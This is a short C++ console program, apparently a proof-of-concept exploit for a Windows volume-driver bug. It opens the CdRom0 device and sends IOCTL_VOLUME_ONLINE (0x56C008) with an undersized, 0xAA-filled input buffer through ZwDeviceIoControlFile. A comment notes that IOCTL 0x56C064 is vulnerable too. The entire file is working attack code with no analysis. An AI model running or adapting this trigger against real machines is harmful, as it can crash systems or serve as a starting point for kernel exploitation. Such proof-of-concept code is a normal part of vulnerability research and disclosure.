// RequestHandleVolumeOnline_Bug.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "windows.h"
#include "stdio.h"

#include "Header.h"







//Same for IOCTL 0x56c064
int POC_0x56C008()
{
	ulong InputAlloc = 0x100000;
	void* pIn = VirtualAlloc(0,InputAlloc,MEM_COMMIT,PAGE_READWRITE);
	ulong OutputAlloc = 0x100000;
	void* pOut = VirtualAlloc(0,OutputAlloc,MEM_COMMIT,PAGE_READWRITE);

	wchar_t* pDevName = (wchar_t*)LocalAlloc(LMEM_ZEROINIT, (MAX_PATH*2) + 2);

	if(pDevName)
	{
		wcscpy(pDevName,L"\\Device\\CdRom0");
		wprintf(L"Opening: %s\r\n",pDevName);

		HANDLE hDev = 0;
		int ret = 0;

		ret = OpenDevice(pDevName,&hDev);
		if(	(ret < 0) || (hDev == INVALID_HANDLE_VALUE ) )
		{
			printf("Can't open device, Error: %X\r\n",ret);
			ExitProcess(0);
			return -22;
		}
		else
		{
				printf("hDevice: %I64X\r\n",hDev);
				memset(pIn,0xAA,InputAlloc);
				ulonglong InputLength = 1;
				ulonglong OutputLength = 0;
				//IOCTL 0x56c064 is also vulnerable
				ulonglong IoCtl = IOCTL_VOLUME_ONLINE;//0x56C008
				void* pInX  = pIn;
				void* pOutX = 0;
				_IO_STATUS_BLOCK IOSB = {0};
				ulonglong ret = ZwDeviceIoControlFile(hDev,
											0 /* hEvent */,
											0 /* ApcRoutine */,
											0 /* ApcContext */,
											&IOSB,
											IoCtl,
											pInX,
											InputLength,
											pOutX,
											OutputLength);
				printf("==> ret: %I64X\r\n",ret);
				ExitProcess(0);
				CloseHandle(hDev);
		}
		LocalFree(pDevName);
	}
	return 0;
}



int _tmain(int argc, _TCHAR* argv[])
{
	POC_0x56C008();
	return 0;
}

